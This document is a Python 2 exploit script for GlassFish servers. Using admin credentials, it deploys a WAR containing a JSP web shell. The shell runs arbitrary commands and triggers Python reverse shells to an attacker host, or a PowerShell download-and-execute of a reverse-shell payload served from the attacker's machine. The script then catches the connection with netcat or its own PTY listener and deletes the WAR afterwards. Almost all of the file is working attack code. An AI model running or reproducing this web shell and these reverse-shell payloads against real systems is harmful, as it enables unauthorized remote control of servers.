#!/usr/bin/env python2
#  -*- coding: utf-8 -*- #######################################################################################
#▄▄ • ▄▄▌   ▄▄▄· .▄▄ · .▄▄ · ·▄▄▄▪  .▄▄ ·  ▄ .▄▄▄▌ ▐ ▄▌ ▄▄▄· ▄▄▄  ▄▄▄   ▄▄· ▄▄▄ .                              #
#▐█ ▀ ▪██•  ▐█ ▀█ ▐█ ▀. ▐█ ▀. ▐▄▄·██ ▐█ ▀. ██▪▐███· █▌▐█▐█ ▀█ ▀▄ █·▀▄ █·▐█ ▌▪▀▄.▀·                             #
#▄█ ▀█▄██▪  ▄█▀▀█ ▄▀▀▀█▄▄▀▀▀█▄██▪ ▐█·▄▀▀▀█▄██▀▐███▪▐█▐▐▌▄█▀▀█ ▐▀▀▄ ▐▀▀▄ ██ ▄▄▐▀▀▪▄                             #
#▐█▄▪▐█▐█▌▐▌▐█ ▪▐▌▐█▄▪▐█▐█▄▪▐███▌.▐█▌▐█▄▪▐███▌▐▀▐█▌██▐█▌▐█ ▪▐▌▐█•█▌▐█•█▌▐███▌▐█▄▄▌                             #
#·▀▀▀▀ .▀▀▀  ▀  ▀  ▀▀▀▀  ▀▀▀▀ ▀▀▀ ▀▀▀ ▀▀▀▀ ▀▀▀ · ▀▀▀▀ ▀▪ ▀  ▀ .▀  ▀.▀  ▀·▀▀▀  ▀▀▀                              #
#                                                                                                              #
# DATE                                                                                                         #
# 06/07/2018                                                                                                   #
#                                                                                                              #
# DESCRIPTION                                                                                                  #
# This code deploy a war to give remote command execution on a glassfish instance                              #
# Note credentials is required. Windows and Linux is supported                                                 #
#                                                                                                              #
# mikael.kall@kindredgroup.com                                                                                 #
#                                                                                                              #
################################################################################################################

import SimpleHTTPServer
import SocketServer
import requests
import signal
import termios
import select
import socket
import os
import fcntl
import sys
import time
import commands

from multiprocessing import Process

# Handler to exist cleanly on ctrl+C
def signal_handler(signal, frame):
    print "\nYou pressed Ctrl+C!"
    cleanup_war()
    sys.exit()
signal.signal(signal.SIGINT, signal_handler)

class PTY:
    def __init__(self, slave=0, pid=os.getpid()):
        # apparently python GC's modules before class instances so, here
        # we have some hax to ensure we can restore the terminal state.
        self.termios, self.fcntl = termios, fcntl

        # open our controlling PTY
        self.pty = open(os.readlink("/proc/%d/fd/%d" % (pid, slave)), "rb+")

        # store our old termios settings so we can restore after
        # we are finished
        self.oldtermios = termios.tcgetattr(self.pty)

        # get the current settings se we can modify them
        newattr = termios.tcgetattr(self.pty)

        # set the terminal to uncanonical mode and turn off
        # input echo.
        newattr[3] &= ~termios.ICANON & ~termios.ECHO

        # don't handle ^C / ^Z / ^\
        newattr[6][termios.VINTR] = '\x00'
        newattr[6][termios.VQUIT] = '\x00'
        newattr[6][termios.VSUSP] = '\x00'

        # set our new attributes
        termios.tcsetattr(self.pty, termios.TCSADRAIN, newattr)

        # store the old fcntl flags
        self.oldflags = fcntl.fcntl(self.pty, fcntl.F_GETFL)
        # fcntl.fcntl(self.pty, fcntl.F_SETFD, fcntl.FD_CLOEXEC)
        # make the PTY non-blocking
        fcntl.fcntl(self.pty, fcntl.F_SETFL, self.oldflags | os.O_NONBLOCK)

    def read(self, size=8192):
        return self.pty.read(size)

    def write(self, data):
        ret = self.pty.write(data)
        self.pty.flush()
        return ret

    def fileno(self):
        return self.pty.fileno()

    def __del__(self):
        # restore the terminal settings on deletion
        self.termios.tcsetattr(self.pty, self.termios.TCSAFLUSH, self.oldtermios)
        self.fcntl.fcntl(self.pty, self.fcntl.F_SETFL, self.oldflags)


class Shell:
    def __init__(self, addr, bind=True):
        self.bind = bind
        self.addr = addr

        if self.bind:
            self.sock = socket.socket()
            self.sock.bind(self.addr)
            self.sock.listen(5)

    def handle(self, addr=None):
        addr = addr or self.addr
        if self.bind:
            sock, addr = self.sock.accept()
        else:
            sock = socket.socket()
            sock.connect(addr)

        # create our PTY
        pty = PTY()

        # input buffers for the fd's
        buffers = [[sock, []], [pty, []]]

        def buffer_index(fd):
            for index, buffer in enumerate(buffers):
                if buffer[0] == fd:
                    return index

        readable_fds = [sock, pty]

        data = " "
        # keep going until something deds
        while data:
            # if any of the fd's need to be written to, add them to the
            # writable_fds
            writable_fds = []
            for buffer in buffers:
                if buffer[1]:
                    writable_fds.append(buffer[0])

            r, w, x = select.select(readable_fds, writable_fds, [])

            # read from the fd's and store their input in the other fd's buffer
            for fd in r:
                buffer = buffers[buffer_index(fd) ^ 1][1]
                if hasattr(fd, "read"):
                    data = fd.read(8192)
                else:
                    data = fd.recv(8192)
                if data:
                    buffer.append(data)

            # send data from each buffer onto the proper FD
            for fd in w:
                buffer = buffers[buffer_index(fd)][1]
                data = buffer[0]
                if hasattr(fd, "write"):
                    fd.write(data)
                else:
                    fd.send(data)
                buffer.remove(data)

        # close the socket
        sock.close()


def deploy_war():

    # Change to management port
    if URL[-5:] == ':8080':
        _url = URL[:-5] + ':4848'
    else:
        _url = URL

    # Make it easy for us use curl.
    cmd = '''curl --insecure --user '%s:%s' -s ''' % (USERNAME, PASSWORD)
    cmd += '''-H 'User-Agent: hk2-agent' '''
    cmd += '''-H 'X-Requested-By: cli' '''
    cmd += '''-H 'Accept: application/json' '''
    cmd += '''-F id=@/tmp/warfiles/cmd.war -F force=true '''
    cmd += '''%s/management/domain/applications/application''' % _url

    (res, output) = commands.getstatusoutput(cmd)

    if res != 0 or not 'created successfully' in output:
        print("[-] Deployment of war failed")
        os._exit(0)

    print("[+] Deploy successful")



def undeploy_war():

    time.sleep(30)
    cleanup_war()


def cleanup_war():
    # Change to management port
    if URL[-5:] == ':8080':
        _url = URL[:-5] + ':4848'
    else:
        _url = URL

    cmd =  '''curl --insecure --user 'admin:admin' -s '''
    cmd += '''-H 'User-Agent: hk2-agent' '''
    cmd += '''-H 'X-Requested-By: cli' '''
    cmd += '''-X DELETE https://localhost:4848/management/domain/applications/application/cmd'''

    (res, output) = commands.getstatusoutput(cmd)

    if res != 0 or not 'deleted successfully' in output:
        print("[-] Failed to delete payload")
        os._exit(0)

    print("[+] Payload deleted")


def build_war():

    try:
        os.makedirs('/tmp/warfiles/META-INF')
        os.makedirs('/tmp/warfiles/WEB-INF')
    except:
        pass

    web_xml = '''<?xml version="1.0" ?>
<web-app xmlns="http://java.sun.com/xml/ns/j2ee"
xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
xsi:schemaLocation="http://java.sun.com/xml/ns/j2ee
http://java.sun.com/xml/ns/j2ee/web-app_2_4.xsd"
version="2.4">
<servlet>
<servlet-name>Command</servlet-name>
<jsp-file>/cmd.jsp</jsp-file>
</servlet>
</web-app>
'''

    with open('/tmp/warfiles/WEB-INF/web.xml', 'w') as f:
        f.write(web_xml)

    manifest_mf = '''Manifest-Version: 1.0
Created-By: 1.6.0_10 (Sun Microsystems Inc.)
'''

    with open('/tmp/warfiles/META-INF/MANIFEST.MF', 'w') as f:
        f.write(manifest_mf)

    cmd_jsp = '''<%@ page import="java.util.*,java.io.*"%>\n'''
    cmd_jsp += '''<%\n'''

    cmd_jsp += '''if (request.getParameter("cmd") != null) {
    Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
    OutputStream os = p.getOutputStream();
    InputStream in = p.getInputStream();
    DataInputStream dis = new DataInputStream(in);
    String disr = dis.readLine();
    while ( disr != null ) {
        out.println(disr);
        disr = dis.readLine();
    }
}\n'''

    cmd_jsp += '''if (request.getParameter("py2") != null) {'''
    cmd_jsp += ''' String [] command = {"/usr/bin/python2","-c", "import pty,socket,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\"%s\\",%s));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\\"/bin/bash\\");s.close()"};
    Runtime rt = Runtime.getRuntime();
    Process pr = rt.exec( command );
    pr.waitFor();\n}\n''' % (LHOST, LPORT)

    cmd_jsp += '''if (request.getParameter("py3") != null) {'''
    cmd_jsp += ''' String [] command = {"/usr/bin/python3","-c", "import pty,socket,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\"%s\\",%s));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\\"/bin/bash\\");s.close()"};
    Runtime rt = Runtime.getRuntime();
    Process pr = rt.exec( command );
    pr.waitFor();\n}\n''' % (LHOST, LPORT)

    cmd_jsp += '''if (request.getParameter("win") != null) {'''
    cmd_jsp += '''String [] command = {"powershell", "\\"IEX(New-Object Net.WebClient).downloadString('http://%s:8000/shell.ps1')\\""};
    Runtime rt = Runtime.getRuntime();
    Process pr = rt.exec( command );
    pr.waitFor();\n}\n''' % LHOST
    cmd_jsp += '''%>'''

    with open('/tmp/warfiles/cmd.jsp', 'w') as f:
        f.write(cmd_jsp)

    os.system('cd /tmp/warfiles && jar cvf cmd.war . >/dev/null 2>&1')

def check_file(filename):

    url = "%s/cmd/cmd.jsp?cmd=ls+%s" % (URL, filename)

    if url[:8] == 'https://':
        url = url.replace('https://', "http://")

    r = requests.get(url)

    if r.text.strip() == filename:
        return True
    else:
        return False

def is_windows():

    if check_file('/usr/bin/python2') is False and check_file('/usr/bin/python3') is False:
        return True

    return False

    #===================================
    # Old code we should fix this.
    #===================================
    #url = "%s/cmd/cmd.jsp?cmd=ver" % URL
    #r = requests.get(url)
    #if 'windows' in r.text.lower().strip():
    #    return True
    #else:
    #    return False

def exploit():
    time.sleep(5)

    print("[+] Exploit")

    if check_file('/usr/bin/python2') is True:
        url = "%s/cmd/cmd.jsp?py2" % URL
    elif check_file('/usr/bin/python3') is True:
        url = "%s/cmd/cmd.jsp?py3" % URL
    else:
        print("[-] Python not installed on target server.")
        return False

    if url[:8] == 'https://':
        url = url.replace('https://', "http://")

    requests.get(url)

def exploit_windows():
    time.sleep(5)
    print("[+] Exploit")
    url = "%s/cmd/cmd.jsp?win" % URL

    if url[:8] == 'https://':
        url = url.replace('https://', "http://")

    requests.get(url)

def build_windows_payload():

    payload = '''function Invoke-PowerShellTcp 
{ 
    [CmdletBinding(DefaultParameterSetName="reverse")] Param(

        [Parameter(Position = 0, Mandatory = $true, ParameterSetName="reverse")]
        [Parameter(Position = 0, Mandatory = $false, ParameterSetName="bind")]
        [String]
        $IPAddress,
        [Parameter(Position = 1, Mandatory = $true, ParameterSetName="reverse")]
        [Parameter(Position = 1, Mandatory = $true, ParameterSetName="bind")]
        [Int]
        $Port,
        [Parameter(ParameterSetName="reverse")]
        [Switch]
        $Reverse,
        [Parameter(ParameterSetName="bind")]
        [Switch]
        $Bind
    )

    try 
    {
        #Connect back if the reverse switch is used.
        if ($Reverse)
        {
            $client = New-Object System.Net.Sockets.TCPClient($IPAddress,$Port)
        }

        $stream = $client.GetStream()
        [byte[]]$bytes = 0..65535|%{0}

        #Send back current username and computername
        $sendbytes = ([text.encoding]::ASCII).GetBytes("Windows PowerShell running as user " + $env:username + " on " + $env:computername + "`nCopyright (C) 2015 Microsoft Corporation. All rights reserved.`n`n")
        $stream.Write($sendbytes,0,$sendbytes.Length)

        #Show an interactive PowerShell prompt
        $sendbytes = ([text.encoding]::ASCII).GetBytes('PS ' + (Get-Location).Path + '>')
        $stream.Write($sendbytes,0,$sendbytes.Length)

        while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
        {
            $EncodedText = New-Object -TypeName System.Text.ASCIIEncoding
            $data = $EncodedText.GetString($bytes,0, $i)
            try
            {
                #Execute the command on the target.
                $sendback = (Invoke-Expression -Command $data 2>&1 | Out-String )
            }
            catch
            {
                Write-Warning "Something went wrong with execution of command on the target." 
                Write-Error $_
            }
            $sendback2  = $sendback + 'PS ' + (Get-Location).Path + '> '
            $x = ($error[0] | Out-String)
            $error.clear()
            $sendback2 = $sendback2 + $x

            #Return the results
            $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
            $stream.Write($sendbyte,0,$sendbyte.Length)
            $stream.Flush()  
        }
        $client.Close()
        if ($listener)
        {
            $listener.Stop()
        }
    }
    catch
    {
        Write-Warning "Something went wrong! Check if the server is reachable and you are using the correct port." 
        Write-Error $_
    }
}
'''
    payload += '''Invoke-PowerShellTcp -Reverse -IPAddress %s -Port %s''' % (LHOST, LPORT)

    with open('/tmp/shell.ps1', 'w') as f:
        f.write(payload)

def HttpListener():

    os.chdir('/tmp')
    HTTP_PORT = 8000
    Handler = SimpleHTTPServer.SimpleHTTPRequestHandler
    httpd = SocketServer.TCPServer(("", HTTP_PORT), Handler)
    print("[+] HTTP Listen = %s" % HTTP_PORT)
    httpd.serve_forever()

if __name__ == '__main__':

    if len(sys.argv) != 6:
        print ("""
 ▄▄ • ▄▄▌   ▄▄▄· .▄▄ · .▄▄ · ·▄▄▄▪  .▄▄ ·  ▄ .▄▄▄▌ ▐ ▄▌ ▄▄▄· ▄▄▄  ▄▄▄   ▄▄· ▄▄▄ .
▐█ ▀ ▪██•  ▐█ ▀█ ▐█ ▀. ▐█ ▀. ▐▄▄·██ ▐█ ▀. ██▪▐███· █▌▐█▐█ ▀█ ▀▄ █·▀▄ █·▐█ ▌▪▀▄.▀·
▄█ ▀█▄██▪  ▄█▀▀█ ▄▀▀▀█▄▄▀▀▀█▄██▪ ▐█·▄▀▀▀█▄██▀▐███▪▐█▐▐▌▄█▀▀█ ▐▀▀▄ ▐▀▀▄ ██ ▄▄▐▀▀▪▄
▐█▄▪▐█▐█▌▐▌▐█ ▪▐▌▐█▄▪▐█▐█▄▪▐███▌.▐█▌▐█▄▪▐███▌▐▀▐█▌██▐█▌▐█ ▪▐▌▐█•█▌▐█•█▌▐███▌▐█▄▄▌
·▀▀▀▀ .▀▀▀  ▀  ▀  ▀▀▀▀  ▀▀▀▀ ▀▀▀ ▀▀▀ ▀▀▀▀ ▀▀▀ · ▀▀▀▀ ▀▪ ▀  ▀ .▀  ▀.▀  ▀·▀▀▀  ▀▀▀ 
[mikael.kall@kindredgroup.com]
    """)
        print("Usage: %s <URL> <LHOST> <LPORT> <USERNAME> <PASSWORD>" % (sys.argv[0]))
        print("\nEXAMPLE: ./glassfish_war_rce.py 'https://127.0.0.1:8080' 10.10.14.24 1337 <USERNAME> <PASSWORD>\n")
        sys.exit(0)

    URL = sys.argv[1]
    LHOST = sys.argv[2]
    LPORT = sys.argv[3]
    USERNAME = sys.argv[4]
    PASSWORD = sys.argv[5]

    print("[+] LHOST = %s" % LHOST)

    build_war()
    deploy_war()

    if is_windows() is True:
        print("[+] OS:Windows")
        build_windows_payload()

        # Serve payload
        p = Process(target=HttpListener)
        p.start()

        # Exploit windows
        p = Process(target=exploit_windows)
        p.start()
    else:
        print("[+] OS:Linux")
        # Exploit linux
        p = Process(target=exploit)
        p.start()

    # Remove war
    p = Process(target=undeploy_war)
    p.start()

    if is_windows() is True:
        print "[+] Netcat port: %s" % LPORT
        os.system('nc -lnvp %s' % LPORT)
    else:
        # Start listener
        print("[+] Shell listen")
        s = Shell((LHOST, int(LPORT)), bind=True)
        s.handle()
